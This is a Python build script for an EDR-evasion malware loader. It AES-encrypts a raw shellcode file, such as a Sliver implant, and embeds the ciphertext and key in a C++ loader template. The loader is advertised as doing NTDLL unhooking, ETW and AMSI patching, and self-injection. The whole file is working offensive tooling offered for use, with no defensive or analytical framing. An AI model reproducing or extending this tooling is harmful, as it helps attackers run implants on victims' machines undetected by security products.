#!/usr/bin/env python3
"""
encrypt_hybrid.py - Encrypt for hybrid EDR loader
"""

import sys
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

def encrypt_shellcode(shellcode_file, output_file):
    """Encrypt shellcode and create ready-to-compile loader"""
    
    # Read shellcode
    print(f"[+] Reading shellcode from {shellcode_file}...")
    with open(shellcode_file, 'rb') as f:
        shellcode = f.read()
    
    print(f"[+] Shellcode size: {len(shellcode)} bytes")
    
    # Generate random AES-256 key and IV
    key = get_random_bytes(32)  # 256 bits
    iv = get_random_bytes(16)   # 128 bits
    
    print(f"[+] Generated AES-256 key: {key.hex()}")
    print(f"[+] Generated IV: {iv.hex()}")
    
    # Encrypt with AES-256-CBC
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(shellcode, AES.block_size))
    
    # Prepend IV to encrypted data
    encrypted_with_iv = iv + encrypted
    
    print(f"[+] Encrypted size: {len(encrypted_with_iv)} bytes")
    
    # Read loader template
    with open('loader_edr_hybrid.cpp', 'r') as f:
        loader_code = f.read()
    
    # Format encrypted shellcode as C array
    shellcode_array = ','.join(f'0x{b:02x}' for b in encrypted_with_iv)
    key_array = ','.join(f'0x{b:02x}' for b in key)
    
    # Replace placeholders
    loader_code = loader_code.replace('/* ENCRYPTED_SHELLCODE_HERE */', shellcode_array)
    loader_code = loader_code.replace('/* AES_KEY_HERE */', key_array)
    
    # Write output
    print(f"[+] Writing loader to {output_file}...")
    with open(output_file, 'w') as f:
        f.write(loader_code)
    
    print(f"[+] ✅ Success!")
    print(f"\n[*] Hybrid loader includes:")
    print(f"    • AES-256-CBC encryption")
    print(f"    • NTDLL unhooking")
    print(f"    • ETW patching")
    print(f"    • AMSI patching")
    print(f"    • Simple self-injection (PROVEN METHOD)")

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: ./encrypt_hybrid.py <shellcode.bin> <output.cpp>")
        print("\nExample:")
        print("  ./encrypt_hybrid.py sliver.bin loader_encrypted.cpp")
        sys.exit(1)
    
    shellcode_file = sys.argv[1]
    output_file = sys.argv[2]
    
    if not os.path.exists(shellcode_file):
        print(f"[-] Error: {shellcode_file} not found!")
        sys.exit(1)
    
    if not os.path.exists('loader_edr_hybrid.cpp'):
        print(f"[-] Error: loader_edr_hybrid.cpp template not found!")
        sys.exit(1)
    
    encrypt_shellcode(shellcode_file, output_file)
